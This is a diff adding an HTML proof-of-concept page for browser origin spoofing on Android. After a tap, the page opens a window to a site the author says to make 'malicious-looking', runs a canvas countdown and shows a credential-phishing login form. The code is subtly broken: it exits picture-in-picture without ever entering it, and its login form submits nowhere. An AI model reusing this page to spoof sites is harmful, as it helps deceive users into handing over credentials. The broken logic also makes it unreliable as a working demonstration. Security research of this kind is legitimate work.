@@ -1,0 +1,145 @@
+<!doctype html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced PoC: URL Spoofing</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            color: #333;
+            overflow: hidden;
+        }
+
+        #container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        #instructions {
+            font-size: 2em;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        #spoofContent {
+            display: none;
+            text-align: center;
+            border: 2px solid #cc0000;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        #spoofForm {
+            margin-top: 20px;
+        }
+
+        #canvasElem {
+            display: none;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .animate {
+            animation: fadeIn 1s forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .flashing {
+            animation: flash 1s infinite;
+        }
+
+        @keyframes flash {
+            0%, 100% { background-color: #ffcccc; }
+            50% { background-color: #ff9999; }
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <div id="startContent" class="animate">
+            <h1>Advanced PoC: Android Origin Spoof</h1>
+            <p id="instructions">Tap anywhere to start</p>
+        </div>
+        <div id="spoofContent" class="hidden">
+            <h1 class="flashing">⚠️ Spoof Alert! ⚠️</h1>
+            <p>A login form from a suspicious source has appeared!</p>
+            <h2>You must log in to continue</h2>
+            <div id="spoofForm">
+                <input id="inputElem" name="email" placeholder="Email" />
+                <br>
+                <input name="password" placeholder="Password" type="password" />
+                <input type="submit" value="Submit" />
+            </div>
+            <p class="hidden">For support, contact <a href="mailto:support@fake.com">support@fake.com</a></p>
+        </div>
+        <canvas id="canvasElem"></canvas>
+    </div>
+    <script>
+        const spoofUrl = 'https://www.example.com/'; // Change to a malicious-looking site
+        const delayToWaitForScroll = 1500;
+        let showingPiP = false;
+
+        const drawCanvas = (text) => {
+            const canvasElem = document.getElementById('canvasElem');
+            const ctx = canvasElem.getContext('2d');
+            const targetWidth = 800;
+            const targetHeight = 400;
+            canvasElem.width = targetWidth;
+            canvasElem.height = targetHeight;
+
+            ctx.fillStyle = '#fff';
+            ctx.fillRect(0, 0, targetWidth, targetHeight);
+            ctx.fillStyle = '#000';
+            ctx.font = '40px Arial';
+            ctx.fillText(text, 50, targetHeight / 2);
+        };
+
+        const handleUserInteraction = () => {
+            const startContent = document.getElementById('startContent');
+            const spoofContent = document.getElementById('spoofContent');
+
+            startContent.classList.add('hidden');
+            spoofContent.classList.remove('hidden');
+
+            // Simulate scrolling down after 3 seconds
+            setTimeout(() => {
+                document.body.scrollTo({
+                    top: document.body.scrollHeight,
+                    behavior: 'smooth'
+                });
+            }, 3000);
+
+            // Open the spoof URL
+            const newWin = window.open(spoofUrl, 'spoof_window');
+            drawCanvas('3');
+            setTimeout(() => drawCanvas('2'), 1000);
+            setTimeout(() => drawCanvas('1'), 2000);
+            setTimeout(() => {
+                drawCanvas('Scroll down slowly');
+                setTimeout(() => {
+                    newWin.close();
+                    document.exitPictureInPicture();
+                }, delayToWaitForScroll);
+            }, 3000);
+        };
+
+        window.addEventListener('click', () => {
+            if (!showingPiP) {
+                showingPiP = true;
+                handleUserInteraction();
+            }
+        });
+    </script>
+</body>
+</html>
